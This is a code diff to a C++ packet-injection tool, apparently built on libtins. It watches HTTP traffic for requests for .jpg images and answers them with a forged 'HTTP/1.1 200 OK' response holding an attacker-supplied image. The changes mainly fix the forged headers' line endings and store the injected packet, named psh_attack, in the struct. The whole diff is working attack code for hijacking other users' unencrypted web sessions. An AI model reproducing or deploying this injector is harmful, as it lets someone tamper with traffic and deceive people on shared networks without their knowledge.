@@ -10,6 +10,7 @@ string mac;
 char *sf_dev;
 char *sd_dev;
 char *path;
+
 struct pk_set
 {
     typedef HWAddress<6> address;
@@ -19,6 +20,7 @@ struct pk_set
     PacketSender sender;
     uint8_t *image;
     u_int32_t len;
+    EthernetII psh_attack;
     bool web_image(char *_data)
     {
         return (bool)strstr(_data,".jpg");
@@ -62,6 +64,7 @@ struct pk_set
     }
     void pk_swap(EthernetII ethernet, IP ip, TCP tcp)
     {
+        //address(mac)
         new_ethernet.src_addr(address(mac));
         new_ethernet.dst_addr(ethernet.src_addr());
         new_ip.src_addr(ip.dst_addr());
@@ -69,6 +72,7 @@ struct pk_set
         new_tcp.sport(tcp.dport());
         new_tcp.dport(tcp.sport());
         new_tcp.flags(0x18);
+
     }
     void tcp_caculator(TCP tcp,uint32_t payload_len)
     {
@@ -77,7 +81,7 @@ struct pk_set
     }
     void chg_send()
     {
-        EthernetII psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\nContent-Length: 1221\n\n")/RawPDU((const uint8_t *)image,len);
+        psh_attack = new_ethernet / new_ip / new_tcp / RawPDU("HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nContent-Length: 1221\r\n\r\n")/RawPDU((const uint8_t *)image,len);
         sender.send(psh_attack, sd_dev);
         cout<<"send packet\n";
         debug(new_ethernet,new_ip,new_tcp);
@@ -89,6 +93,7 @@ struct pk_set
         const TCP &tcp = pdu.rfind_pdu<TCP>();
         const RawPDU& raw = tcp.rfind_pdu<RawPDU>();
         const RawPDU::payload_type& payload = raw.payload();
+
         if(tcp.flags() == 0x18 && tcp.dport() == 0x50 && web_image((char *)payload.data()))
         {
             pk_swap(ethernet,ip,tcp);
@@ -97,6 +102,7 @@ struct pk_set
             cout<<"request packet \n";
             debug(ethernet,ip,tcp);
             cout<<payload.data()<<"\n";
+
         }
         return true;
     }
